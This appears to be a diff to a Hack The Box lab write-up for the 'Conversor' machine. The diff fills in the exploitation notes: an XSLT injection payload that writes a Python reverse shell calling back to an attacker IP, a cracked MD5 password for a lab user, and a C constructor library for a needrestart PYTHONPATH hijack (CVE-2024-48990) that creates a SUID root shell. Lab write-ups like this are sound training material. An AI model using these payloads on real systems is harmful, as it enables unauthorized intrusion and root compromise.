@@ -1,4 +1,4 @@
-Tags: #Easy #Linux #Apache #Source-Code-Analysis/Web-page #XSLT 
+Tags: #Easy #Linux #Apache #Source-Code-Analysis/Web-page #XSLT-Injection #Weak-Hashing-Algorithms #Weak-Passwords #Outdated-software #Search-Path-Hijack
 # **Nmap Results**
 
 ```text
@@ -79,6 +79,11 @@ However, there's **no XSLT filtering** in the `/convert` page. The following lin
 ```
 <xsl:value-of select="system-property('xsl:version')" />
 ```
+<br>
+<br>
+# **Exploitation**
+## **Initial Access**
+There's a file called **app.wsgi** that reveals the webroot directory to be **/var/www/conversor.htb**
 
 Source code contains a **scripts** directory, maybe we can drop a python reverse shell in there.
 `lxml` has the EXSL extension enabled by default, which includes the element `exsl:document` for writing to files.
@@ -92,36 +97,76 @@ XSLT payload:
 
   <xsl:template match="/">
     <h1>idk man</h1>
-    <exsl:document href="scripts/shell.py" method="text">
-      import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.253&quot;,9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/bash&quot;)
+    <exsl:document href="/var/www/conversor.htb/scripts/shell.py" method="text">
+      import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.54",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")
     </exsl:document>
   </xsl:template>
 </xsl:stylesheet>
 ```
-<br>
-<br>
-# **Exploitation**
-## **Initial Access**
-Document here:
-* Exploit used (link to exploit)
-* Explain how the exploit works against the service
-* Any modified code (and why you modified it)
-* Proof of exploit (screenshot of reverse shell with target IP address output)
 
+After waiting a few seconds, you get a shell as www-data:
+
+![[Pasted image 20260211175231.png]]
+
+Within the webroot dir, there's a sqlite3 database that stored user credentials:
+
+
+![[Pasted image 20260211175733.png]]
+
+![[Pasted image 20260211180009.png]]
+
+The passwords are stored as an md5 hash. fismathack is a user on the box, determined by /etc/passwd, so we want his password. 
+
+hashes.com reveals it to be `Keepmesafeandwarm`. SSH login successful.
 <br>
 <br>
 # **Privilege Escalation**  
 
-Document here:
-* Exploit used (link to exploit)
-* Explain how the exploit works 
-* Any modified code (and why you modified it)
-* Proof of privilege escalation (screenshot showing ip address and privileged username)
+Output of `sudo -l`:
+
+```
+Matching Defaults entries for fismathack on conversor:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User fismathack may run the following commands on conversor:
+    (ALL : ALL) NOPASSWD: /usr/sbin/needrestart
+```
+
+The `needrestart` binary is running version 3.7. This [GitHub]([https://github.com/ten-ops/CVE-2024-48990_needrestart.git](https://github.com/makuga01/CVE-2024-48990-PoC)) repo is a POC for CVE-2024-48990, which is a vulnerability in needrestart caused by improperly setting the PYTHONPATH environment variable. 
+
+An attacker can modify it at runtime to point to a directory they control with a malicious python module to execute code as root. The best module to create a fake of is `importlib` because it's loaded very early in the startup process (python needs a proper import mechanism), so your code will be more likely to execute.
+
+`gcc` not on target machine, so you have to compile lib.c locally then serve the file to the target. 
+
+Contents of lib.c:
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/types.h>
+#include <unistd.h>
+
+static void a() __attribute__((constructor));
+
+void a() {
+ setuid(0);
+ setgid(0);
+ const char *shell = "cp /bin/sh /tmp/poc; chmod u+s /tmp/poc &";
+ system(shell);
+}
+```
+
+A python script needs to be running so that `needrestart` can call the interpreter as root and do its check as normal. The POC provides one that checks for the SUID bit shell copy in an infinite loop, then calls it with the `-p` flag to preserve root privileges, but any other would work. 
+
+To trigger the scan from `needrestart`, execute `sudo needrestart -r a` in another terminal session:
+
+![[Pasted image 20260211234501.png]]
 <br>
 <br>
 # Skills Learned
-Document here what you've learned after completing the box
+- XSLT is like CSS but for XML and actually has scripting capabilities (xsl:for-each, xsl:value-of, etc.). Depending on the processor, it has multiple extensions for more functionality. However, this can be dangerous and lead to XSLT Injection if input is not sanitized. 
+- Python's initialization process can be hijacked under the right conditions. Executing it as root and interacting with user processes/data is unsafe.
 <br>
 <br>
 # Proof of Pwn
-Paste link to HTB Pwn notification after owning root
+https://labs.hackthebox.com/achievement/machine/391579/787
